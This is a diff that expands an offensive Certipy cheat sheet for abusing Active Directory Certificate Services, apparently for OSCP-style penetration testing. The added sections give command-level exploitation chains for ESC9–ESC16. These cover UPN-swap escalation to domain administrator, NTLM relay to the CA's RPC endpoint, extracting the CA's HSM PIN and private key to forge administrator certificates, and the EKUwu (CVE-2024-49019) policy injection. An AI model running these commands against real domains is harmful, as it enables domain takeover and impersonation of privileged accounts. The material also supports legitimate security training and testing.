@@ -1,6 +1,6 @@
 # Certipy ADCS Cheat Sheet — Enumeration & Abuse (OSCP-style)
 
-Certipy (`ly4k/Certipy`, PyPI package `certipy-ad`) is the primary tool for enumerating and abusing Active Directory Certificate Services (AD CS / PKI) misconfigurations ("ESC1–ESC16"). This sheet covers the core sub-commands (`find`, `req`, `auth`, `shadow`, `account`) and gives command-level exploitation paths for ESC1–ESC8.
+Certipy (`ly4k/Certipy`, PyPI package `certipy-ad`) is the primary tool for enumerating and abusing Active Directory Certificate Services (AD CS / PKI) misconfigurations ("ESC1–ESC16"). This sheet covers the core sub-commands (`find`, `req`, `auth`, `shadow`, `account`) and gives command-level exploitation paths for ESC1–ESC8 in depth (§2–§3), with a reference-depth ESC9–ESC16 addendum in §6.
 
 Install: `pip install certipy-ad` (invoked as `certipy` or `certipy-ad`).
 
@@ -32,6 +32,7 @@ Install: `pip install certipy-ad` (invoked as `certipy` or `certipy-ad`).
 certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
 certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -stdout
 ```
+**Faster initial triage (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD -M adcs` lists CAs and template names quickly before a full `certipy find` pass.
 Key flags: `-text` (default, file), `-stdout` (print to console instead of file), `-json`, `-csv`, `-output prefix`, `-enabled` (only enabled templates), `-vulnerable` (only templates flagged exploitable given the caller's group memberships), `-oids` (issuance policy OIDs, relevant to ESC13/ESC15), `-hide-admins` (suppress noisy admin ACEs), `-dc-only` (LDAP-only, skip live CA RPC/HTTP checks — useful when CA is unreachable/firewalled), `-bloodhound` / `-old-bloodhound` (BloodHound-compatible export).
 
 ### `certipy req` — request/retrieve a certificate
@@ -94,6 +95,18 @@ These target the same weak-certificate-mapping and issuance-policy gaps that KB5
 | **ESC13** | Certificate template's issuance policy OID is linked (via `msPKI-Certificate-Policy` → `msDS-OIDToGroupLink`) to a privileged AD group | `certipy find -u 'user@domain' -p 'password' -dc-ip <IP> -vulnerable -stdout` (look for the OID→group link) → `certipy req -u 'user@domain' -p 'password' -ca CA_NAME -template TEMPLATE_NAME` → `certipy auth -pfx cert.pfx` to inherit the linked group's access |
 
 **Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation · https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html · https://www.hackingarticles.in/adcs-esc9-no-security-extension/ · https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/ · https://adminions.ca/books/adcs/page/esc13
+
+---
+
+## 2c. ESC14–ESC16 Summary Table
+
+| ESC | Misconfiguration | Certipy `find` detection | Exploit command sequence (short form) |
+|---|---|---|---|
+| **ESC14** | Weak **explicit certificate mapping** — a target account's `altSecurityIdentities` attribute maps it to a certificate an attacker can obtain/forge (X509IssuerSerialNumber/X509SubjectOnly/X509RFC822 mapping types can be spoofed) | `[!] Vulnerabilities: ESC14` on the account; `find` flags weak `altSecurityIdentities` mapping types | Enumerate the victim's `altSecurityIdentities` value, obtain/forge a certificate matching the weak mapping, then `certipy auth -pfx forged.pfx -username victim -domain corp.local -dc-ip <dcip>` |
+| **ESC15 (CVE-2024-49019, "EKUwu")** | V1 template with `Enrollee Supplies Subject` allows a requester to inject an arbitrary **Application Policy** (incl. Client Authentication / Certificate Request Agent) into the CSR even though the template doesn't define that EKU, bypassing V1's normally-fixed EKU set | `[!] Vulnerabilities: ESC15` on a V1 template; `find` notes schema version 1 + enrollee-supplied-subject | `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template WebServer -application-policies 'Client Authentication' -upn administrator@corp.local -sid S-1-5-21-...-500` → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
+| **ESC16** | CA-wide flag disables the `szOID_NTDS_CA_SECURITY_EXT` security extension globally (`msPKI-Enrollment-Flag` / registry `DisableExtensionList` includes the security-extension OID) → **every** issued cert lacks the SID extension regardless of template, re-opening ESC1/ESC9/ESC10-style UPN-swap attacks CA-wide | `[!] Vulnerabilities: ESC16`; `find` shows the CA-level flag disabling the security extension | Same UPN-swap technique as ESC9/ESC10, but works against **any** enrollable template on the CA (no per-template weakness needed): `certipy account update -u attacker@domain -p pass -user victim -upn administrator@domain -dc-ip <IP>` → `certipy req -u victim@domain -p victimpass -ca CA_NAME -template User -dc-ip <IP>` → restore UPN → `certipy auth -pfx victim.pfx -dc-ip <IP>` |
+
+**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation · https://research.ifcr.dk/certipy-4-8-esc15-and-more-b3ffcb15e97e (EKUwu / ESC15) · https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019
 
 ---
 
@@ -265,6 +278,111 @@ Clean up after the engagement:
 ```bash
 certipy account delete -u lowpriv@corp.local -p 'Passw0rd!' -user 'EVILPC$'
 ```
+
+---
+
+## 6. ESC9–ESC16 Reference Addendum
+
+Reference-depth, not worked-example-depth: real commands per technique, without the full step-by-step of §3. All eight postdate the original "Certified Pre-Owned" ESC1–ESC8 taxonomy and mostly target the weak-mapping/issuance-policy gaps KB5014754 didn't fully close. Baseline detection pass for all of them:
+```bash
+certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -stdout
+```
+**Faster (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD -M adcs` — same as the §1 triage callout: lists CAs/templates fast but doesn't itself emit ESC9–ESC16 labels, so still follow up with the full `certipy find -vulnerable` pass below for the specific finding text.
+
+### ESC9 — No Security Extension (`CT_FLAG_NO_SECURITY_EXTENSION`)
+**Explanation:** Template is issued without the `szOID_NTDS_CA_SECURITY_EXT` SID extension. On its own this is inert post-KB5014754, but combined with `StrongCertificateBindingEnforcement` left at the default (`1`, Compatibility) on the DC and `GenericWrite` over some victim account, you can temporarily point the victim's UPN at a privileged target, enroll as the victim, and get back a cert that maps by UPN instead of SID. `find -vulnerable` prints `ESC9` under the template's `[!] Vulnerabilities`; raw output shows `No Security Extension : True`.
+```bash
+certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn administrator@corp.local
+certipy req -u Jane@corp.local -p JanePass -ca corp-DC-CA -template ESC9-Template -dc-ip 172.16.126.128
+certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn Jane@corp.local   # restore
+certipy auth -pfx jane.pfx -domain corp.local -dc-ip 172.16.126.128
+```
+**Reference:** https://www.hackingarticles.in/adcs-esc9-no-security-extension/
+
+### ESC10 — Weak certificate mapping (DC registry, not a template flag)
+**Explanation:** Two independent DC-side registry weaknesses, either of which lets a UPN-spoofed cert authenticate regardless of what the template looks like. Case 1 (Schannel/TLS client-cert auth, e.g. LDAPS): `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods` includes the UPN bit (`0x4`). Case 2 (Kerberos PKINIT): `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement` = `0`. Reading either requires remote registry access to the DC (typically already-elevated), e.g. via Impacket:
+```bash
+impacket-reg corp.local/attacker:Passw0rd@dc01.corp.local query \
+  -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel' -v CertificateMappingMethods
+impacket-reg corp.local/attacker:Passw0rd@dc01.corp.local query \
+  -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc' -v StrongCertificateBindingEnforcement
+```
+Case 2 exploit — identical UPN-swap flow to ESC9, but works against **any** enrollable client-auth template (the DC-wide registry key is what's weak, not the template flag):
+```bash
+certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn administrator@corp.local
+certipy req -u Jane@corp.local -p JanePass -ca corp-DC-CA -template User -dc-ip 172.16.126.128
+certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn Jane@corp.local   # restore
+certipy auth -pfx jane.pfx -domain corp.local -dc-ip 172.16.126.128
+```
+Case 1 exploit — same UPN-spoofed cert, but authenticate over Schannel (LDAPS) instead of PKINIT, dropping into Certipy's built-in LDAP shell:
+```bash
+certipy auth -pfx jane.pfx -domain corp.local -ldap-shell -dc-ip 172.16.126.128
+```
+**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation
+
+### ESC11 — NTLM relay to ICPR RPC (no Extended Protection for Authentication)
+**Explanation:** The CA's `ICertPassage` (ICPR) RPC endpoint doesn't require `IF_ENCRYPT`, so NTLM auth to it can be relayed the same way ESC8 relays to the HTTP enrollment endpoint — this route survives the EPA/channel-binding fixes that closed most of ESC8. `find -stdout` shows `Enforce Encryption for Requests : Disabled` under the CA; `-vulnerable` labels it `ESC11`.
+```bash
+certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -stdout
+certipy relay -target 'rpc://ca.corp.local' -ca corp-DC-CA -template DomainController
+```
+Then coerce a privileged host to authenticate to the listener — same coercion primitives as ESC8 §3.3 (PetitPotam/Coercer), just landing on the RPC listener instead of HTTP.
+**Reference:** https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/
+
+### ESC12 — CA private key access (YubiHSM PIN / weak CA host ACLs)
+**Explanation:** If the CA's private key is HSM-protected (commonly YubiHSM) and the authentication PIN is stored in a registry value readable by CA server admins (`HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\CSP\PIN`), or the CA host's local-admin group is weakly delegated, local admin on the CA server equals full CA compromise regardless of AD-level `ManageCA` rights. Certipy `find` does not detect this (it's a host-level issue) — enumerate the registry value / local admins once you have a foothold on the CA box.
+```bash
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\corp-DC-CA\CSP\PIN"
+certutil -exportPFX -p "" My "corp-DC-CA" ca-backup.pfx
+# or, once you hold local admin on the CA host:
+certipy ca -ca 'corp-DC-CA' -backup -u administrator@corp.local -p Passw0rd -target ca.corp.local
+certipy forge -ca-pfx corp-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'
+certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
+```
+**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation
+
+### ESC13 — Issuance policy linked to a privileged group
+**Explanation:** A template's issuance policy OID (`msPKI-Certificate-Policy`) is linked via `msDS-OIDToGroupLink` to a privileged AD group. Enrolling and authenticating with the resulting cert gets you treated as a member of that group (subject to `StrongCertificateBindingEnforcement`/group-membership evaluation on the DC). `find -oids -vulnerable` surfaces the OID→group link directly; `-vulnerable` labels it `ESC13`.
+```bash
+certipy find -u user@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -oids -stdout
+certipy req -u user@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template Esc13Template
+certipy auth -pfx user.pfx -dc-ip 172.16.126.128
+```
+**Reference:** https://adminions.ca/books/adcs/page/esc13
+
+### ESC14 — Explicit certificate mapping (`altSecurityIdentities` abuse)
+**Explanation:** A target account's `altSecurityIdentities` attribute contains a weak explicit mapping (`X509IssuerSerialNumber`, `X509SubjectOnly`, `X509RFC822`, or an implicit/weak issuer entry) to a certificate an attacker can obtain or forge. `find -vulnerable` labels affected accounts `ESC14` with the weak mapping type named in the finding. Dump the mapping, then get (or forge, if you already control a CA) a cert that satisfies it:
+```bash
+certipy account read -u user@corp.local -p Passw0rd -user victim -dc-ip 172.16.126.128
+# X509SubjectOnly-style weak mapping — enroll any ESC1-capable template with a matching Subject:
+certipy req -u user@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local \
+  -template VulnUserCert -subject 'CN=victim'
+certipy auth -pfx victim.pfx -username victim -domain corp.local -dc-ip 172.16.126.128
+```
+**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation
+
+### ESC15 / EKUwu (CVE-2024-49019) — Schema V1 template, attacker-controlled Application Policies
+**Explanation:** A Schema V1 template with `Enrollee Supplies Subject` lets a requester inject an arbitrary Application Policy OID (e.g. Client Authentication, or Certificate Request Agent) into the CSR even though the template never defines that EKU — V1 templates were assumed to have a fixed, non-attacker-controlled EKU set, so this bypasses per-template EKU restrictions on any enrollable V1 template. `find -vulnerable` labels it `ESC15`, noting schema version 1 + enrollee-supplied-subject. Certipy 4.8+ supports it directly via `-application-policies`.
+```bash
+certipy req -u user@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local \
+  -template WebServer -application-policies 'Client Authentication' \
+  -upn administrator@corp.local -sid S-1-5-21-...-500
+certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128
+```
+Same primitive also chains into ESC3: inject `Certificate Request Agent` instead of `Client Authentication` to mint an enrollment-agent cert off a V1 template that was never meant to allow it, then use it for `-on-behalf-of` requests exactly as in §3.2.
+**Reference:** https://research.ifcr.dk/certipy-4-8-esc15-and-more-b3ffcb15e97e · https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019
+
+### ESC16 — Security Extension disabled CA-wide
+**Explanation:** The CA-level `msPKI-Enrollment-Flag`/registry `DisableExtensionList` includes the security-extension OID, so **every** cert the CA issues lacks the SID extension regardless of template — a server-wide version of ESC9 that reopens UPN-swap attacks against any enrollable template, no per-template weakness needed. `find -vulnerable` labels it `ESC16` at the CA level (not per-template).
+```bash
+certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn administrator@corp.local
+certipy req -u Jane@corp.local -p JanePass -ca corp-DC-CA -template User -dc-ip 172.16.126.128
+certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn Jane@corp.local   # restore
+certipy auth -pfx jane.pfx -domain corp.local -dc-ip 172.16.126.128
+```
+**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation
+
+**Exam scope note:** none of ESC9–ESC16 have (or need) a Metasploit path — every technique above is Certipy/Impacket/native `reg`/`certutil`, all fully exam-legal against the AD set. Where a coercion step is needed (ESC11), use PetitPotam/Coercer as in §3.3, not `auxiliary/scanner/*` Metasploit coercion modules.
 
 ---
 
